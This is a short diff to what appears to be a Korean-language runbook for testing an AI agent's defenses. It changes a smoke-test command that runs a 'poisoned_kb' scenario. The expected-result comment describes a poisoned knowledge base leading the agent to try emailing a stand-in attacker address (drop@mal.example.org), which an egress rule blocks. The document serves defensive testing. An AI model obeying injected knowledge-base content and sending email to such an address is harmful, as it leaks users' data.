@@ -596,7 +596,7 @@ python -c "from presidio_analyzer import AnalyzerEngine; print(AnalyzerEngine().
 pytest    # 게이트 · 레일무력화불가 · vault수명 · 뮤테이터속성 · 병렬part순회 · safety_settings
 
 # 3. ★ money smoke (D2) — 프로젝트의 핵심 증명
-python -m src.agent.loop --scenario poisoned_kb --defenses tier_a
+python -m src.agent.cli --scenario poisoned_kb --defenses tier_a --provider scripted
 #   기대: 분류기 전부 OFF, 오염 KB → send_email(drop@mal.example.org) 시도 →
 #         gate_decision=BLOCK, gate_rule=egress.email_domains, executed=false
 
